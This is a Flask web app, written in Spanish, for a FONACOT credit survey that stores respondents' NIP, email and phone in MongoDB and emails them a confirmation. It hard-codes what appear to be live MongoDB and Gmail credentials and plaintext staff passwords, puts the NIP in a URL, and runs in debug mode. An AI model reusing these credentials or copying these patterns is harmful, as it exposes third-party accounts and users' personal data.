from flask import Flask, render_template, request, redirect, session, flash
from pymongo import MongoClient
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__)
app.secret_key = "tu_clave_secreta_aqui"  # Cambia esto por algo seguro

# ---------------- CONEXIÓN A MONGO ATLAS ----------------
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://al222311501:85bV4V9aT4y8mzvY@cluster0.ovqux33.mongodb.net/?retryWrites=true&w=majority")
MONGO_DB = os.getenv("MONGO_DB", "encuesta_credito")

client = MongoClient(MONGO_URI)
db = client[MONGO_DB]
respuestas = db["respuestas"]
# ---------------------------------------------------------

USUARIOS = {
    "RAUL GARRIDO": "TOLUCA2065",
    "ANGELICA CORONEL": "INFONA2025",
    "HECTOR PAZ": "FONACOT2025"
}

# ------------------- CONFIGURACIÓN DE CORREO -------------------
EMAIL_SENDER = "fonacottoluca385@gmail.com"  # Cambia por tu correo Gmail
EMAIL_PASSWORD = "jmhcmnihkibwxcyx"  # Tu contraseña de aplicación de Gmail

def enviar_correo(nip, correo_receptor, numero):
    try:
        asunto = "REGISTRO EXITOSO FONACOT"
        cuerpo = f"Se ha registrado un nuevo usuario:\n\nNIP: {nip}\nCorreo: {correo_receptor}\nNúmero: {numero}"

        mensaje = MIMEMultipart()
        mensaje["From"] = EMAIL_SENDER
        mensaje["To"] = correo_receptor
        mensaje["Subject"] = asunto
        mensaje.attach(MIMEText(cuerpo, "plain"))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.sendmail(EMAIL_SENDER, correo_receptor, mensaje.as_string())
        server.quit()
        print("✅ Correo enviado correctamente a", correo_receptor)
    except Exception as e:
        print(f"❌ Error enviando el correo: {e}")
# ----------------------------------------------------------------

@app.route('/')
def portada():
    return render_template('index.html')

@app.route('/encuesta', methods=['GET', 'POST'])
def encuesta():
    if request.method == 'POST':
        datos = request.form.to_dict()
        datos['fecha'] = datetime.now().strftime("%Y-%m-%d")
        respuestas.insert_one(datos)

        nip = datos.get('nip', '******')
        correo = datos.get('correo', 'No proporcionado')
        numero = datos.get('celular', 'No proporcionado')

        enviar_correo(nip, correo, numero)

        return redirect(f'/registro_exitoso?nip={nip}')
    return render_template('encuesta.html')

@app.route('/registro_exitoso')
def registro_exitoso():
    nip = request.args.get('nip', '******')
    return render_template('registro_exitoso.html', nip=nip)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        usuario = request.form.get('usuario', '').strip().upper()
        password = request.form.get('password', '').strip()
        if usuario in USUARIOS and USUARIOS[usuario] == password:
            session['usuario'] = usuario
            return redirect('/estadisticas')
        else:
            flash('Usuario o contraseña incorrectos')
            return render_template('login.html')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('usuario', None)
    return redirect('/login')

@app.route('/estadisticas')
def estadisticas():
    if 'usuario' not in session:
        return redirect('/login')
    return render_template('estadisticas.html', usuario=session['usuario'])

@app.route('/datos_grafico')
def datos_grafico():
    if 'usuario' not in session:
        return {"error": "No autorizado"}, 401
    data = list(respuestas.find({}, {'_id': 0}))
    return {"data": data}

if __name__ == '__main__':
    app.run(debug=True)
